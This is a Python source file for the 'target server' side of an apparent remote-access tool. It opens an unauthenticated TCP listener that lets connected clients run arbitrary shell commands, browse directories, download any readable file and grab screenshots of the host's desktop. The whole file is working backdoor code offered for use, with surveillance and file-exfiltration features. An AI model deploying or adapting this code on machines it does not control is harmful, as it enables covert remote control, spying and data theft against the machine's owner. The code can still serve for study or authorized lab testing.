import socket
import threading
import platform
import os
import json

from dataclasses import dataclass
from PIL import ImageGrab

from base import PORT, ENCODING, DISCONNECT_MESSAGE
from base import change_dir, send_header_and_data, recv_header_and_data, run_shell_command

from scripts.output_color import colored_error, colored_info, colored_success
from scripts.splitter import command_splitter


@dataclass
class Client:
    """Client object model.
    """
    addr: tuple
    sock: socket.socket


class Server:
    """Target server class.
    """

    def __init__(self, addr: tuple, sock: socket.socket) -> None:
        self.addr = addr
        self.sock = sock
        self.clients: list[Client] = []

    def handle_clients(self, client: Client) -> None:
        """Handle each client connected to the server.

        Args:
            client (dict): client connected to the server.
        """
        
        # Print message when a client is connected.
        print(colored_success('[New connection]: ') +
              f'[{client.addr[0]}:{client.addr[1]}] connected.' +
              colored_info(f'[{len(self.clients)}  Clients 💻]')
              )

        # Listen for client command and send output to the client.
        while True:
            # Receive command.
            command = recv_header_and_data(
                recv_sock=client.sock).decode(encoding=ENCODING)
            # Transform command into list.
            splitted_command = command_splitter(command)

            result = ''

            if (not command) or (command == DISCONNECT_MESSAGE):
                # Stop listen and disconnect the client.
                break

            # --------------- Those commands are not directly used by clients ---------

            if command == 'info':
                # Send current working directory.
                result = os.getcwd()

            # --------------- Commands to run before download -------------------------
            elif splitted_command[0] == 'path-exists':
                # Send True if path exists else False. (serialized with json)
                result = json.dumps(os.path.exists(
                    " ".join(splitted_command[1:])))

            elif splitted_command[0] == 'has-permission':
                # Send True if has permission to read on path else False. (serialized with json)
                result = json.dumps(
                    os.access(splitted_command[1], mode=os.R_OK))

            elif splitted_command[0] == 'path-type':
                # Send path type. ('directory' or 'file')
                if os.path.isdir(splitted_command[-1]):
                    result = 'directory'
                elif os.path.isfile(splitted_command[-1]):
                    result = 'file'

            elif splitted_command[0] == 'list-content':
                # Send list of directory contents. (serialized with json)
                result = json.dumps(os.listdir(" ".join(splitted_command[1:])))
            # -------------------------------------------------------------------------

            # -------------------------------------------------------------------------

            # --------------- Commands directly used by clients -----------------------

            elif splitted_command[0] == 'cd':
                # Change directory and send current working directory path.
                if len(splitted_command) == 2:
                    result = change_dir(splitted_command[1])
                else:
                    # Send an error message if the path doesn't exists.
                    result = colored_error('[Argument Error] for cd command.')

            elif command == 'os':
                # Send Information about OS.
                result = platform.platform()

            elif command == 'clients':
                # Send list of clients connected to the server.
                client_list = [client.addr for client in self.clients]
                result = str(client_list)

            elif splitted_command[0] == 'download':
                # Send file or directory contents to the client.
                path = splitted_command[-1]
                with open(path, 'rb') as f:
                    result = f.read()

            elif splitted_command[0] == 'capture':
                # Take, send and delete screenshot.
                try:
                    image = ImageGrab.grab()
                    image.save('.screenshot.png', 'png')
                    with open('.screenshot.png', 'rb') as img:
                        result = img.read()
                    os.remove('.screenshot.png')
                except OSError:
                    result = 'screenshot-error'
            # -------------------------------------------------------------------------

            # --------------- Shell Commands ------------------------------------------
            else:
                result = run_shell_command(command)
            # -------------------------------------------------------------------------

            if splitted_command[0] not in \
                    ['info', 'path-exists', 'has-permission', 'path-type', 'list-content']:
                # Print commands sent by the client and exclude some commands.
                print(colored_info(
                    f'[{client.addr[0]}:{client.addr[1]}] ⌨ >') + f' {command}')

            if not result:
                # Send an error message if the command has no output.
                result = colored_error('[Error], no output')

            if isinstance(result, str):
                # Encode the output if the output is str object.
                result = result.encode(encoding=ENCODING)

            # Send the output to the client.
            send_header_and_data(client.sock, result)

        # Print a disconnect message when client is disconnected
        # and remove the client from server clients list.
        print(colored_success(
            f'[{client.addr[0]}: {client.addr[1]}] Disconnected 👋'))
        self.clients.remove(client)

    def start(self) -> None:
        """Start the server and listen for clients connections.
        """

        # Socket configuration.
        self.sock.setsockopt(
            socket.SOL_SOCKET, socket.SO_REUSEADDR, socket.SOCK_STREAM)
        self.sock.bind(self.addr)
        self.sock.listen()

        # Print message when server is up.
        print(colored_success('\n[Server start]') + ' at ' +
              colored_info(f'[{self.addr[0]}:{self.addr[1]}]') + ' 📡')

        while True:
            try:
                client_socket, client_address = self.sock.accept()
            except KeyboardInterrupt:
                confirm = input('\nDo you want to stop the server? [y/n]: ')
                if 'y' in confirm.lower():
                    if self.clients:
                        for client in self.clients:
                            client.sock.close()
                    break
                continue
            else:
                client = Client(client_address, client_socket)
                self.clients.append(client)
                thread = threading.Thread(
                    target=self.handle_clients, args=(client,))
                thread.start()

        # Close socket and print message when server is down.
        self.sock.close()
        print(colored_error('[Server down] 👻👋'))


if __name__ == '__main__':
    while True:
        # Print information about machine available IP addresses.
        ip_list = socket.getaddrinfo(
            socket.gethostname(), PORT, family=socket.AF_INET)
        print(colored_info('[IP List]') + ' List of IP address\n')
        for i, ip in enumerate(ip_list):
            print(colored_info(f'{i+1}') + f' - {ip[-1]}')

        print('\nIn which address would you like to run the server?')

        # Chose the IP address of the server.
        try:
            server_index = int(input(colored_info('[IP Choice]: ')))
            server_address = ip_list[server_index-1][-1]
        except (ValueError, IndexError):
            print(colored_error(
                '\n[Choice Error] ' + f'Chose between {[i+1 for i in range(len(ip_list))]}'))
        except KeyboardInterrupt:
            print(colored_error('Exit'))
            break
        else:
            # Run the server.
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server = Server(server_address, server_socket)
            server.start()
            break
